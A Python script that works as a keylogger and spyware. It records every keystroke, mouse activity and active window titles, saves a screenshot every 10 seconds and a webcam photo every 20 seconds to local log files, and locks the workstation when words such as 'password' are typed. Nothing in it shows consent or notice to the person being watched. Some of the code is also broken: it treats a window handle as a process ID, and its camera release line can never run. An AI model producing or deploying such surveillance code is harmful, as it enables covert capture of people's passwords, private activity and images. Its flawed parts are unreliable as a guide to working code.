from pynput import keyboard, mouse
import threading
from datetime import datetime
from PIL import ImageGrab
import time
import psutil
import pygetwindow as gw
import os
import ctypes
import cv2

# Ensure the log directory exists
log_directory = "logs"
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# File paths
keys_log_file = os.path.join(log_directory, "keys_log.txt")
mouse_moves_log_file = os.path.join(log_directory, "mouse_moves_log.txt")
mouse_clicks_log_file = os.path.join(log_directory, "mouse_clicks_log.txt")
application_activity_log_file = os.path.join(log_directory, "application_activity_log.txt")
error_log_file = os.path.join(log_directory, "error_log.txt")

# Define strings that should trigger the lock
trigger_strings = ["lock", "password", "shutdown"]  # Example trigger strings
typed_chars = []

def lock_workstation():
    ctypes.windll.user32.LockWorkStation()

def log_keys():
    def on_press(key):
        global typed_chars
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            char = key.char
            typed_chars.append(char)
            with open(keys_log_file, "a") as log_file:
                log_file.write(f'[{timestamp}] {char}\n')
        except AttributeError:
            char = str(key)
            typed_chars.append(char)
            with open(keys_log_file, "a") as log_file:
                log_file.write(f'[{timestamp}] {char}\n')

        # Check if any of the trigger strings are typed
        typed_str = ''.join(typed_chars[-len(max(trigger_strings, key=len)):])
        for trigger in trigger_strings:
            if trigger in typed_str:
                lock_workstation()
                typed_chars = []  # Reset typed_chars to avoid multiple alerts for the same string

    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def log_mouse():
    def on_move(x, y):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(mouse_moves_log_file, "a") as log_file:
            log_file.write(f'[{timestamp}] Mouse moved to ({x}, {y})\n')

    def on_click(x, y, button, pressed):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        if pressed:
            with open(mouse_clicks_log_file, "a") as log_file:
                log_file.write(f'[{timestamp}] Mouse clicked at ({x}, {y}) with {button}\n')

    with mouse.Listener(on_move=on_move, on_click=on_click) as listener:
        listener.join()

def take_screenshots():
    while True:
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(log_directory, f'screenshot_{timestamp}.png'))
        time.sleep(10)  # Take screenshot every 10 seconds

def log_application_activity():
    while True:
        try:
            active_window = gw.getActiveWindow()
            if active_window:
                window_title = active_window.title
                try:
                    pid = active_window._hWnd
                    process = psutil.Process(pid)
                    process_name = process.name()
                except psutil.NoSuchProcess:
                    process_name = "Unknown (process terminated)"
                except Exception as e:
                    process_name = f"Error retrieving process name: {e}"
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                with open(application_activity_log_file, "a") as log_file:
                    log_file.write(f'[{timestamp}] {process_name}: {window_title}\n')
            time.sleep(5)  # Log every 5 seconds
        except Exception as e:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(error_log_file, "a") as log_file:
                log_file.write(f'[{timestamp}] Error: {str(e)}\n')
            time.sleep(5)

def take_user_pic():
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if ret:
            timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            cv2.imwrite(os.path.join(log_directory, f'user_pic_{timestamp}.png'), frame)
        time.sleep(20)  # Take a user picture every 20 seconds
    cap.release()

if __name__ == "__main__":
    t1 = threading.Thread(target=log_keys)
    t2 = threading.Thread(target=log_mouse)
    t3 = threading.Thread(target=take_screenshots)
    t4 = threading.Thread(target=log_application_activity)
    t5 = threading.Thread(target=take_user_pic)

    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()

    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
